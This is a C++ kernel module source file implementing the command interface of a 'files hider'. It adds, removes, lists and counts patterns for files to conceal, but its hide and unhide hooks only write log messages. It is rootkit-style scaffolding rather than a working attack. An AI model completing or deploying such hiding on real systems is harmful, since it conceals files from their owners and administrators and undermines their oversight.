#include "kernel_module/features/files_hider/kernel_files_hider_server.hpp"

#include "kernel_api/kernel_api.h"

#include <cstring>
#include <limits>

namespace
{
constexpr const char* k_list_command = "@list";
constexpr const char* k_stats_command = "@stats";

} // namespace

cpp_ssize_t KernelFilesHiderServer::read_kernel(void* kbuf, size_t len, const std::int64_t* pos)
{
    (void)pos;
    if (len == 0)
    {
        return 0;
    }

    const size_t copy_len = _response_len < len ? _response_len : len;
    memcpy(kbuf, _response_buf.data(), copy_len);
    return static_cast<cpp_ssize_t>(copy_len);
}

cpp_ssize_t KernelFilesHiderServer::write_kernel(const void* kbuf, size_t len,
                                                 const std::int64_t* pos)
{
    (void)pos;
    if (_response_len == 0U)
    {
        set_response_literal("Ready");
    }
    if (len == 0)
    {
        set_response_literal("Invalid Command");
        return 0;
    }

    std::array<char, k_max_command_len + 1U> command_buf{};
    const size_t copy_len = len < k_max_command_len ? len : k_max_command_len;
    memcpy(command_buf.data(), kbuf, copy_len);
    const size_t command_len = trim_command_len(command_buf.data(), copy_len);
    handle_command(command_buf.data(), command_len);
    return static_cast<cpp_ssize_t>(len);
}

void KernelFilesHiderServer::handle_command(const char* command, size_t command_len)
{
    if (command_len == 0U)
    {
        set_response_literal("Invalid Command");
        return;
    }
    if (command[0] == '+')
    {
        if (command_len == 1U)
        {
            set_response_literal("Invalid Command");
            return;
        }
        add_hidden_pattern(command + 1, command_len - 1U);
        return;
    }
    if (command[0] == '-')
    {
        if (command_len == 1U)
        {
            set_response_literal("Invalid Command");
            return;
        }
        remove_hidden_pattern(command + 1, command_len - 1U);
        return;
    }
    if (command_len == 5U && std::memcmp(command, k_list_command, 5U) == 0)
    {
        list_hidden_patterns();
        return;
    }
    if (command_len == 6U && std::memcmp(command, k_stats_command, 6U) == 0)
    {
        list_hidden_patterns_with_stats();
        return;
    }

    set_response_literal("Invalid Command");
}

void KernelFilesHiderServer::add_hidden_pattern(const char* pattern, size_t pattern_len)
{
    const size_t stored_len = pattern_len < k_max_pattern_len ? pattern_len : k_max_pattern_len;
    size_t idx = 0;
    while (idx < _hidden_patterns.size())
    {
        HiddenPatternStats& item = _hidden_patterns[idx];
        if (item.used && pattern_equals(item, pattern, stored_len))
        {
            hide_pattern_hook(pattern, stored_len);
            set_response_literal("Added");
            return;
        }
        ++idx;
    }

    idx = 0;
    while (idx < _hidden_patterns.size())
    {
        HiddenPatternStats& item = _hidden_patterns[idx];
        if (!item.used)
        {
            item.used = true;
            item.pattern_len = stored_len;
            std::memset(item.pattern.data(), 0, item.pattern.size());
            std::memcpy(item.pattern.data(), pattern, stored_len);
            item.matches = 0;
            item.misses = 0;
            hide_pattern_hook(pattern, stored_len);
            set_response_literal("Added");
            return;
        }
        ++idx;
    }

    hide_pattern_hook(pattern, stored_len);
    set_response_literal("Added");
}

void KernelFilesHiderServer::remove_hidden_pattern(const char* pattern, size_t pattern_len)
{
    size_t idx = 0;
    while (idx < _hidden_patterns.size())
    {
        HiddenPatternStats& item = _hidden_patterns[idx];
        if (item.used && pattern_equals(item, pattern, pattern_len))
        {
            unhide_pattern_hook(pattern, pattern_len);
            item.used = false;
            item.pattern_len = 0;
            item.matches = 0;
            item.misses = 0;
            std::memset(item.pattern.data(), 0, item.pattern.size());
            set_response_literal("Removed");
            return;
        }
        ++idx;
    }

    set_response_literal("Not Found");
}

void KernelFilesHiderServer::list_hidden_patterns()
{
    _response_len = 0;
    size_t listed = 0;
    for (size_t idx = 0; idx < _hidden_patterns.size(); ++idx)
    {
        const HiddenPatternStats& item = _hidden_patterns[idx];
        if (!item.used)
        {
            continue;
        }
        if (listed > 0U)
        {
            (void)append_to_response('\n');
        }
        (void)append_to_response(item.pattern.data(), item.pattern_len);
        ++listed;
    }

    if (listed == 0U)
    {
        set_response_literal("Empty");
        return;
    }
    wrap_current_content_as_response();
}

void KernelFilesHiderServer::list_hidden_patterns_with_stats()
{
    update_statistics_hook();
    _response_len = 0;
    size_t listed = 0;
    for (size_t idx = 0; idx < _hidden_patterns.size(); ++idx)
    {
        const HiddenPatternStats& item = _hidden_patterns[idx];
        if (!item.used)
        {
            continue;
        }
        if (listed > 0U)
        {
            (void)append_to_response('\n');
        }
        (void)append_to_response(item.pattern.data(), item.pattern_len);
        (void)append_to_response(" matches=", 9U);
        (void)append_u64_to_response(item.matches);
        (void)append_to_response(" misses=", 8U);
        (void)append_u64_to_response(item.misses);
        ++listed;
    }

    if (listed == 0U)
    {
        set_response_literal("Empty");
        return;
    }
    wrap_current_content_as_response();
}

void KernelFilesHiderServer::set_response(const char* content, size_t content_len)
{
    _response_len = 0;
    (void)append_to_response("@{", 2U);
    (void)append_to_response(content, content_len);
    (void)append_to_response("}@", 2U);
}

void KernelFilesHiderServer::set_response_literal(const char* content)
{
    size_t content_len = 0;
    while (content[content_len] != '\0')
    {
        ++content_len;
    }
    set_response(content, content_len);
}

size_t KernelFilesHiderServer::trim_command_len(const char* command, size_t command_len)
{
    while (command_len > 0U)
    {
        const char last = command[command_len - 1U];
        if (last == ' ' || last == '\t' || last == '\n' || last == '\r')
        {
            --command_len;
            continue;
        }
        break;
    }
    return command_len;
}

bool KernelFilesHiderServer::pattern_equals(const HiddenPatternStats& item, const char* pattern,
                                            size_t pattern_len)
{
    return item.pattern_len == pattern_len &&
           std::memcmp(item.pattern.data(), pattern, pattern_len) == 0;
}

bool KernelFilesHiderServer::append_to_response(char ch)
{
    if (_response_len >= _response_buf.size())
    {
        return false;
    }
    _response_buf[_response_len] = ch;
    ++_response_len;
    return true;
}

bool KernelFilesHiderServer::append_to_response(const char* text, size_t text_len)
{
    if (_response_len + text_len > _response_buf.size())
    {
        text_len = _response_buf.size() - _response_len;
    }
    if (text_len == 0U)
    {
        return false;
    }
    std::memcpy(_response_buf.data() + _response_len, text, text_len);
    _response_len += text_len;
    return true;
}

bool KernelFilesHiderServer::append_u64_to_response(std::uint64_t value)
{
    std::array<char, 32> digits{};
    size_t digits_len = 0;
    if (value == 0U)
    {
        digits[0] = '0';
        digits_len = 1;
    }
    else
    {
        while (value > 0U && digits_len < digits.size())
        {
            digits[digits_len] = static_cast<char>('0' + (value % 10U));
            value /= 10U;
            ++digits_len;
        }
    }

    while (digits_len > 0U)
    {
        if (!append_to_response(digits[digits_len - 1U]))
        {
            return false;
        }
        --digits_len;
    }
    return true;
}

void KernelFilesHiderServer::wrap_current_content_as_response()
{
    std::array<char, k_max_response_len> content{};
    const size_t content_len = _response_len;
    if (content_len > 0U)
    {
        std::memcpy(content.data(), _response_buf.data(), content_len);
    }
    set_response(content.data(), content_len);
}

void KernelFilesHiderServer::hide_pattern_hook(const char* pattern, size_t pattern_len) const
{
    const size_t max_log_len = static_cast<size_t>(std::numeric_limits<int>::max());
    const int log_len = static_cast<int>(pattern_len < max_log_len ? pattern_len : max_log_len);
    cpp_printk(CPP_KERN_INFO "[CPP] FilesHider hide_pattern_hook called for: %.*s\n", log_len,
               pattern);
}

void KernelFilesHiderServer::unhide_pattern_hook(const char* pattern, size_t pattern_len) const
{
    const size_t max_log_len = static_cast<size_t>(std::numeric_limits<int>::max());
    const int log_len = static_cast<int>(pattern_len < max_log_len ? pattern_len : max_log_len);
    cpp_printk(CPP_KERN_INFO "[CPP] FilesHider unhide_pattern_hook called for: %.*s\n", log_len,
               pattern);
}

void KernelFilesHiderServer::update_statistics_hook() const
{
    cpp_printk(CPP_KERN_INFO "[CPP] FilesHider update_statistics_hook called\n");
}
